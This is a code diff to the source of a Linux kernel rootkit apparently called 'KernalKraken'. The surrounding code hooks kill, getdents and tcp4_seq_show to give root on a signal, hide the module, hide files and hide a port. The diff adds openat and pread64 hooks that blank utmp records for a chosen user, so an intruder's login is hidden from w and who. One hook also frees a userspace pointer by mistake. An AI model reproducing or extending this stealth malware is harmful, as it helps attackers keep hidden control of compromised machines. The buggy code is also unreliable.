@@ -2,6 +2,7 @@
 #include "../headers/KernalKraken.h"
 #include "../headers/credentials.h"
 #include "../headers/stealth.h"
+#include "../headers/utmp.h"
 
 enum signals{
     SIGSUPER = 64, // become root
@@ -11,8 +12,8 @@ enum signals{
 
 unsigned long *__sys_call_table = NULL;
 static short hidden = 0;
-static struct list_head *prev_module;
 char hide_pid[NAME_MAX];
+int tamper_file_descriptor;
 
 #if PTREGS_SYSCALL_STUB
 
@@ -21,6 +22,7 @@ char hide_pid[NAME_MAX];
  * if signale is 63 hides the rootkit
  * kill
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html
 static asmlinkage long hook_kill(const struct pt_regs *regs){
     int sig = regs->si;
     pid_t pid = regs->di;
@@ -59,6 +61,7 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
  * sending any directory created to the dmesg logs
  * mkdir
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html
 static asmlinkage int hook_mkdir(const struct pt_regs *regs){
     char __user *pathname = (char *)regs->di;
     char dir_name[NAME_MAX] = {0};
@@ -78,6 +81,7 @@ static asmlinkage int hook_mkdir(const struct pt_regs *regs){
  * hiding directories and files with the PREFIX
  * getdents64
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html
 static asmlinkage long hook_getdents64(const struct pt_regs *regs){
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
     struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -136,6 +140,7 @@ done:
  * hiding directories and files with the PREFIX
  * getdents
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html
 static asmlinkage long hook_getdents(const struct pt_regs *regs){
     struct linux_dirent {
         unsigned long d_ino;
@@ -200,6 +205,7 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs){
  * hiding open ports that is equal to  PORT
  * tcp4_seq_show
 */
+// not a syscall
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
     struct sock *sk = v;
     int port;
@@ -218,12 +224,112 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
      */
     return orig_tcp4_seq_show(seq, v);
 }
+
+/* figure out the file descriptor for the utmp file then save it to change in the pread64 */
+// see http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html
+static asmlinkage long hook_openat(const struct pt_regs *regs){
+    char *filename = (char *)regs->si;
+
+    char *kbuf; // buffer to store the filename 
+    long err;
+    char *target = "/var/run/utmp";
+    int target_len = 14;
+
+    /* allocates memory on the heap if it fails then it calls the original and exits*/
+    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
+    if(kbuf == NULL){
+        return orig_openat(regs);
+    }
+
+    /* get the filename that openat is looking at from userspace otherwise calls the original and exits */
+    err = copy_from_user(kbuf, filename, NAME_MAX);
+    if(err){
+        return orig_openat(regs);
+    }
+
+    /*
+    `* Compare the filename to "/var/run/utmp"
+     * If we get a match, call orig_openat(), save the result in tamper_file_descriptor,
+     * and return after freeing the kernel buffer. We just about get away with
+     * this delay between calling and returning
+    */
+    if(memcmp(kbuf, target, target_len) == 0){
+        tamper_file_descriptor = orig_openat(regs);
+        printk(KERN_INFO "got the taper fd %d", tamper_file_descriptor);
+        kfree(kbuf);
+        return tamper_file_descriptor;
+    }
+
+    /* if there is no match then just free heap space and continue with the regular execution*/
+    kfree(kbuf);
+    return orig_openat(regs);
+}
+
+/* preads64 looks at the file and hides the user that is USER so it dosn't show up in w, who, finger */
+// see http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html
+static asmlinkage long hook_pread64(const struct pt_regs *regs){
+    //file descriptor that preads is trying to read
+    int file_descriptor = regs->di;
+    char * buf = (char *)regs->si;
+    size_t count = regs->dx;
+
+    char *kbuf;
+    struct utmp *utmp_buffer;
+    long err;
+    int i, ret;
+    /* check that the file we are reading is the file we want to change */
+    if((tamper_file_descriptor == file_descriptor) && (tamper_file_descriptor != 0) && 
+    (tamper_file_descriptor != 1) && (tamper_file_descriptor !=2)){
+        //setting up the kernel buffer on the heap
+        kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
+        if(kbuf == NULL){
+            return orig_pread64(regs);
+        }
+        /*
+         * Do the real syscall, save the return value in ret
+         * buf will then hold a utmp struct, but we need to copy it into kbuf first
+        */
+        ret = orig_pread64(regs);
+        err = copy_from_user(kbuf, buf, count);
+        if(err != 0){
+            return ret;
+        }
+
+        //compare the kbuff to the .utmp buffer 
+        utmp_buffer = (struct utmp *)kbuf;
+        if( memcmp(utmp_buffer->ut_user, USER, strlen(USER)) == 0){
+            printk(KERN_INFO "found a match and going to overwrite");
+            //if there is a match we just rewrite the buffer with 0x0
+            for(i =0; i < count; i++){
+                kbuf[i] = 0x0;
+            }
+            
+            err = copy_to_user(buf, kbuf, count);
+
+            kfree(kbuf);
+            return ret;
+        }
+
+        /*
+         * We intercepted a sys_pread64() to /var/run/utmp, but this entry
+         * isn't about HIDDEN_USER, so just free the kernel buffer and return
+         */
+        kfree(buf);
+        return ret;
+    }
+    /*
+     * This isn't a sys_pread64() to /var/run/utmp, do nothing
+     */
+    return orig_pread64(regs);
+}
+
 #else
 /**
  * if signal is 64 then gives the current user root privilegs
  * if signale is 63 hides the rootkit
  * kill
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html
 static asmlinkage long hook_kill(pid_t pid, int sig){
 	void set_root(void);
     void hide_me(void);
@@ -259,6 +365,7 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
  * sending any directory created to the dmesg logs
  * mkdir
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html
 static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
 
     char dir_name[NAME_MAX] = {0};
@@ -278,6 +385,7 @@ static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
  * hiding directories and files with the PREFIX
  * getdents64
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html
 static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
     struct linux_dirent64 *current_dir, *previous_dir = NULL;
     unsigned long index = 0;
@@ -326,6 +434,7 @@ done:
  * hiding directories and files with the PREFIX
  * getdents
 */
+//see http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html
 static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
     struct linux_dirent{
         unsigned long d_ino;
@@ -384,4 +493,6 @@ static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("__x64_sys_openat", hook_openat, &orig_openat),
+    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
 };
